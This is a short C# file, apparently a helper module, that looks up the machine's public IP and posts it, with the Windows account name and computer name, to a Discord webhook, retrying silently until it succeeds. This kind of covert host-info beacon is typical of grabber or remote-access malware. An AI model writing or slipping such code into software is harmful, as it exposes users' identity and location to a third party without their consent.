using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace DiscordHook
{
    public static class Alerts
    {
        public static async Task<string> GetIpAsync()
        {
            while (true)
            {
                try
                {
                    return await new HttpClient().GetStringAsync("https://api.ipify.org");
                }
                catch 
                {
                    await Task.Delay(500);
                }
            }
        }

        public static async Task SendHookAlertAsync(string ip, string dshook)
        {
            while (true)
            {
                try
                {
                    await new HttpClient().PostAsync(dshook, new FormUrlEncodedContent(new Dictionary<string, string>{
                        {"content", $"```IP: {ip}\nSession name: {System.Security.Principal.WindowsIdentity.GetCurrent().Name}\n" +
                                    $"Computer name: {Environment.MachineName}```"},
                        {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
                        {"avatar_url", "https://cdn.discordapp.com/attachments/785419281135042564/854132950098903050/d225266ddff6e8d7dc387d671704308c.png"}
                    }));
                    break;
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }
    }
}